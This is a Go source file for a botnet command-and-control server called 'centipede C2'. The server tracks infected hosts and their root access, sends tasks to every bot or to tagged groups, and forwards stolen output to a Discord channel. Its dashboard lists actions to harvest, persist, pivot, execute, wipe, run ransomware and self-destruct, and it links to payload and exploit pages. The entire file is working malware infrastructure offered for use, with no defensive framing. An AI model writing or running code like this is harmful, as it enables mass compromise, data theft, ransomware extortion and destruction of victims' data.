package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

type Bot struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	IP        string    `json:"ip"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	Kernel    string    `json:"kernel"`
	FirstSeen time.Time `json:"first_seen"`
	LastSeen  time.Time `json:"last_seen"`
	Layer     int       `json:"c2_layer"`
	Tag       string    `json:"tag"`
	Privilege string    `json:"privilege"`
	Connected bool      `json:"connected"`
	Pending   int       `json:"pending_tasks"`
}

type Command struct {
	ID        string    `json:"id"`
	BotID     string    `json:"bot_id"`
	Action    string    `json:"action"`
	Args      string    `json:"args"`
	Status    string    `json:"status"`
	Result    string    `json:"result"`
	CreatedAt time.Time `json:"created_at"`
	Target    string    `json:"target"`
}

type C2Server struct {
	mu        sync.RWMutex
	bots      map[string]*Bot
	commands  map[string]*Command
	wsClients map[string]*websocket.Conn
	upgrader  websocket.Upgrader

	discordSession *discordgo.Session
	discordChanID  string
}

func NewC2Server() *C2Server {
	return &C2Server{
		bots:      make(map[string]*Bot),
		commands:  make(map[string]*Command),
		wsClients: make(map[string]*websocket.Conn),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
	}
}

func main() {
	var (
		addr        = flag.String("addr", ":8443", "Listen address")
		discordTok  = flag.String("discord-token", "", "Discord bot token")
		discordChan = flag.String("discord-channel", "", "Discord channel ID")
		certFile    = flag.String("cert", "", "TLS cert file")
		keyFile     = flag.String("key", "", "TLS key file")
	)
	flag.Parse()

	log.SetFlags(log.LstdFlags | log.Lshortfile)
	srv := NewC2Server()

	if *discordTok != "" && *discordChan != "" {
		go srv.startDiscord(*discordTok, *discordChan)
	}

	r := mux.NewRouter()
	api := r.PathPrefix("/api").Subrouter()
	api.HandleFunc("/bots", srv.handleBots).Methods("GET")
	api.HandleFunc("/bots/{id}", srv.handleBotDetail).Methods("GET")
	api.HandleFunc("/bots/{id}/tag", srv.handleTagBot).Methods("POST")
	api.HandleFunc("/command", srv.handleSendCommand).Methods("POST")
	api.HandleFunc("/commands", srv.handleCommands).Methods("GET")
	api.HandleFunc("/stats", srv.handleStats).Methods("GET")

	r.HandleFunc("/ws", srv.handleWebSocket)
	r.HandleFunc("/ws/bot", srv.handleBotWS)
	r.HandleFunc("/", srv.handleDashboard)
	r.PathPrefix("/static/").Handler(
		http.StripPrefix("/static/",
			http.FileServer(http.Dir("web/static"))))

	httpSrv := &http.Server{
		Addr:    *addr,
		Handler: r,
	}

	go func() {
		if *certFile != "" && *keyFile != "" {
			log.Printf("[c2d] listening on https://%s", *addr)
			log.Fatal(httpSrv.ListenAndServeTLS(*certFile, *keyFile))
		} else {
			log.Printf("[c2d] listening on http://%s", *addr)
			log.Fatal(httpSrv.ListenAndServe())
		}
	}()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
}

func (s *C2Server) handleDashboard(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	tmpl := template.Must(template.New("dashboard").Parse(dashboardHTML))
	tmpl.Execute(w, s.getStats())
}

func (s *C2Server) handleBots(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	list := make([]*Bot, 0, len(s.bots))
	for _, b := range s.bots {
		list = append(list, b)
	}
	writeJSON(w, list)
}

func (s *C2Server) handleBotDetail(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	s.mu.RLock()
	bot, ok := s.bots[vars["id"]]
	s.mu.RUnlock()
	if !ok {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	writeJSON(w, bot)
}

func (s *C2Server) handleTagBot(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	var req struct{ Tag string `json:"tag"` }
	json.NewDecoder(r.Body).Decode(&req)
	s.mu.Lock()
	if bot, ok := s.bots[vars["id"]]; ok {
		bot.Tag = req.Tag
	}
	s.mu.Unlock()
	writeJSON(w, map[string]string{"status": "ok"})
}

func (s *C2Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BotID  string `json:"bot_id"`
		Tag    string `json:"tag"`
		Action string `json:"action"`
		Args   string `json:"args"`
	}
	json.NewDecoder(r.Body).Decode(&req)

	cmdID := genID()
	cmd := &Command{
		ID:        cmdID,
		BotID:     req.BotID,
		Action:    req.Action,
		Args:      req.Args,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	s.mu.Lock()
	s.commands[cmdID] = cmd

	if req.Tag != "" {
		for _, bot := range s.bots {
			if bot.Tag == req.Tag {
				s.sendToBot(bot.ID, cmd)
			}
		}
	} else if req.BotID == "" {
		for _, bot := range s.bots {
			s.sendToBot(bot.ID, cmd)
		}
	} else {
		s.sendToBot(req.BotID, cmd)
	}
	s.mu.Unlock()

	writeJSON(w, cmd)
}

func (s *C2Server) sendToBot(botID string, cmd *Command) {
	s.mu.RLock()
	conn, ok := s.wsClients[botID]
	s.mu.RUnlock()
	if !ok {
		return
	}
	conn.WriteJSON(map[string]interface{}{
		"t":    "task",
		"id":   cmd.ID,
		"act":  cmd.Action,
		"args": cmd.Args,
	})
}

func (s *C2Server) handleCommands(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	list := make([]*Command, 0, len(s.commands))
	for _, c := range s.commands {
		list = append(list, c)
	}
	writeJSON(w, list)
}

func (s *C2Server) handleStats(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, s.getStats())
}

func (s *C2Server) getStats() map[string]interface{} {
	s.mu.RLock()
	defer s.mu.RUnlock()
	connected := 0
	root := 0
	for _, b := range s.bots {
		if b.Connected {
			connected++
		}
		if b.Privilege == "root" {
			root++
		}
	}
	return map[string]interface{}{
		"total_bots":   len(s.bots),
		"connected":    connected,
		"root_bots":    root,
		"pending_cmds": len(s.commands),
		"version":      "0.1.0",
	}
}

func (s *C2Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			break
		}
	}
}

func (s *C2Server) handleBotWS(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	var botID string
	for {
		var msg map[string]interface{}
		if err := conn.ReadJSON(&msg); err != nil {
			break
		}

		msgType, _ := msg["t"].(string)
		botID, _ = msg["bid"].(string)

		switch msgType {
		case "register":
			hostname, _ := msg["hostname"].(string)
			bot := &Bot{
				ID:        botID,
				Hostname:  hostname,
				FirstSeen: time.Now(),
				LastSeen:  time.Now(),
				Connected: true,
			}
			s.mu.Lock()
			s.wsClients[botID] = conn
			s.bots[botID] = bot
			s.mu.Unlock()

		case "result":
			taskID, _ := msg["tid"].(string)
			ok, _ := msg["ok"].(bool)
			output, _ := msg["out"].(string)
			s.mu.Lock()
			if cmd, exists := s.commands[taskID]; exists {
				cmd.Status = "completed"
				cmd.Result = output
				if !ok {
					cmd.Status = "failed"
				}
			}
			s.mu.Unlock()

			if s.discordSession != nil {
				content := fmt.Sprintf("```\n[%s] %s\n%s\n```", taskID, botID, output)
				s.discordSession.ChannelMessageSend(s.discordChanID, content)
			}

		case "ping":
			s.mu.Lock()
			if bot, ok := s.bots[botID]; ok {
				bot.LastSeen = time.Now()
				bot.Connected = true
			}
			s.mu.Unlock()
			conn.WriteJSON(map[string]string{"t": "pong"})
		}
	}

	s.mu.Lock()
	if bot, ok := s.bots[botID]; ok {
		bot.Connected = false
	}
	delete(s.wsClients, botID)
	s.mu.Unlock()
}

func (s *C2Server) startDiscord(token, channelID string) {
	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Printf("[c2d] discord: %v", err)
		return
	}
	s.discordChanID = channelID

	sess.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		if m.ChannelID != channelID || m.Author.ID == s.State.User.ID {
			return
		}
	})

	intents := discordgo.IntentGuildMessages | discordgo.IntentMessageContent
	sess.Identify.Intents = intents
	if err := sess.Open(); err != nil {
		log.Printf("[c2d] discord open: %v", err)
		return
	}
	sess.ChannelMessageSend(channelID, "**centipede C2 online**")
	s.discordSession = sess
}

func writeJSON(w http.ResponseWriter, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(v)
}

func genID() string {
	b := make([]byte, 12)
	io.ReadFull(rand.Reader, b)
	return hex.EncodeToString(b)
}

const dashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>centipede C2</title>
    <link rel="stylesheet" href="/static/css/dark.css">
</head>
<body>
<div id="app">
    <nav id="sidebar">
        <div class="logo">
            <span class="icon">🐛</span>
            <h1>centipede</h1>
            <span class="version">v0.1.0</span>
        </div>
        <div class="nav-stats">
            <div class="stat-card"><span class="stat-value">{{ .total_bots }}</span><span class="stat-label">Total Bots</span></div>
            <div class="stat-card"><span class="stat-value">{{ .connected }}</span><span class="stat-label">Online</span></div>
            <div class="stat-card"><span class="stat-value">{{ .root_bots }}</span><span class="stat-label">Root</span></div>
        </div>
        <ul class="nav-links">
            <li class="active" data-view="dashboard"><a href="#">Dashboard</a></li>
            <li data-view="bots"><a href="#">Bots</a></li>
            <li data-view="commands"><a href="#">Commands</a></li>
            <li data-view="payloads"><a href="#">Payloads</a></li>
            <li data-view="exploits"><a href="#">Exploits</a></li>
        </ul>
    </nav>
    <main id="content">
        <div id="view-dashboard" class="view active">
            <div class="view-header"><h2>Dashboard</h2></div>
            <div class="dashboard-grid">
                <div class="panel"><div class="panel-header">Bot Activity</div><div class="panel-body"><div id="activity-log"></div></div></div>
                <div class="panel"><div class="panel-header">Quick Command</div><div class="panel-body">
                    <select id="cmd-action" class="input">
                        <option value="enum">Enumerate</option><option value="harvest">Harvest</option><option value="persist">Persist</option>
                        <option value="pivot">Pivot</option><option value="exec">Execute</option><option value="wipe">Wipe</option>
                        <option value="ransomware">Ransomware (run)</option>
                        <option value="ransomware_decrypt">Ransomware (decrypt)</option>
                        <option value="selfdestruct">Self Destruct</option>
                    </select>
                    <input type="text" id="cmd-args" class="input" placeholder="Arguments JSON">
                    <button id="btn-send-cmd" class="btn btn-accent" style="width:100%">Send to All</button>
                </div></div>
            </div>
        </div>
        <div id="view-bots" class="view">
            <div class="view-header"><h2>Bots</h2><input type="text" id="bot-search" class="input" style="width:200px" placeholder="Search..."></div>
            <div class="panel"><div class="panel-body"><table><thead><tr><th>ID</th><th>Hostname</th><th>Status</th><th>Privilege</th><th>Tag</th><th>Command</th></tr></thead><tbody id="bot-list"></tbody></table></div></div>
        </div>
        <div id="view-commands" class="view"><div class="view-header"><h2>Command History</h2></div><div class="panel"><div class="panel-body"><table><thead><tr><th>ID</th><th>Action</th><th>Status</th><th>Result</th></tr></thead><tbody id="cmd-list"></tbody></table></div></div></div>
        <div id="view-payloads" class="view"><div class="view-header"><h2>Payload Suite</h2></div><div class="payload-grid" id="payload-list"></div></div>
        <div id="view-exploits" class="view"><div class="view-header"><h2>Exploit Arsenal</h2></div><div class="panel"><div class="panel-body" id="exploit-list"></div></div></div>
    </main>
</div>
<script src="/static/js/app.js"></script></body></html>`
